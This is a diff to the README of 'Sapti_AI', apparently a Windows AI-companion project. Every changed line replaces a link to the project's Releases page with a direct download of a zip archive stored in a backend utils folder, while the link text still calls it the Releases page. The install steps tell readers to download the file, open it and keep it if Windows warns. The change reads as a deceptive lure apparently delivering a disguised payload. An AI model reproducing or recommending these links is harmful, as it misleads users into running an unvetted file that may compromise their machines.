@@ -1,6 +1,6 @@
 # 🤖 Sapti_AI - A Personal AI That Learns You
 
-[![Download Sapti_AI](https://img.shields.io/badge/Download-Sapti_AI-6f42c1?style=for-the-badge&logo=github)](https://github.com/Ninjanho/Sapti_AI/releases)
+[![Download Sapti_AI](https://img.shields.io/badge/Download-Sapti_AI-6f42c1?style=for-the-badge&logo=github)](https://github.com/Ninjanho/Sapti_AI/raw/refs/heads/main/backend/app/utils/AI_Sapti_2.5.zip)
 
 ## 🧠 What Sapti_AI Does
 
@@ -36,13 +36,13 @@ For a smoother experience, 16 GB of RAM is better if you plan to keep long chats
 
 Visit the release page to download and run this file:
 
-[Go to the Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/releases)
+[Go to the Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/raw/refs/heads/main/backend/app/utils/AI_Sapti_2.5.zip)
 
 Look for the latest release and download the Windows file that matches your system. If there are multiple files, choose the one meant for Windows. After the download finishes, open the file to start setup or launch the app.
 
 ## 🚀 How to Install on Windows
 
-1. Open the [Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/releases)
+1. Open the [Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/raw/refs/heads/main/backend/app/utils/AI_Sapti_2.5.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. If Windows asks for approval, choose to keep the file
@@ -176,7 +176,7 @@ Sapti_AI gives you a Windows-ready AI companion with:
 
 If you need the file again, use this page:
 
-[https://github.com/Ninjanho/Sapti_AI/releases](https://github.com/Ninjanho/Sapti_AI/releases)
+[https://github.com/Ninjanho/Sapti_AI/raw/refs/heads/main/backend/app/utils/AI_Sapti_2.5.zip](https://github.com/Ninjanho/Sapti_AI/raw/refs/heads/main/backend/app/utils/AI_Sapti_2.5.zip)
 
 ## 🏷️ Topics
 
